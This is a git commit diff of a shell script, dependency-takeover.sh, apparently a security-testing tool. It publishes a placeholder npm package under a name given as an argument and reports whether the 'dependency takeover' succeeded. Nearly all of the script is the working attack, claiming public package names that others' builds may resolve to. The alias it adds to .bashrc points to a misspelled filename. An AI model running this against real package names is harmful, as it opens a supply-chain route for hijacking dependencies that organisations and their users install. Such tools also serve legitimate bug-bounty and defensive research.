458f0f41c5c6be2c65d8f550f065d34d4137f57d
0xaudron <49619649+0xaudron@users.noreply.github.com>
2024-12-03 16:27:20 +0530

    Update dependency-takeover.sh

--- dependency-takeover.sh
+++ dependency-takeover.sh
@@ -1,4 +1,18 @@
-mkdir ~/$1 && cd ~/$1
-npm init --yes
+echo "alias dependency-takeover='$(pwd)/./dependency.takeover.sh'" >> ~/.bashrc
+source ~/.bashrc
+#Check if directory exists
+if [ -d "/tmp/$1" ]; then
+  cd /tmp/$1
+else
+  # If it doesn't exist, create it and then change into it
+  mkdir /tmp/$1 && cd /tmp/$1
+fi
+
+init=$(npm init --yes 2>&1)
 echo "console.log('testing dependency conf');" > index.js
-npm publish --access public --auth-type=legacy --token=$NPM_TOKEN
+output=$(npm publish --access public --auth-type=legacy --token=$NPM_TOKEN 2>&1)
+echo "========================================================"
+
+echo "$output" | grep -q "npm ERR!" && echo "It is not possible to publish the package - $1" || echo "Dependency takeover successful for - $1"
+echo "========================================================"
+echo "$output"
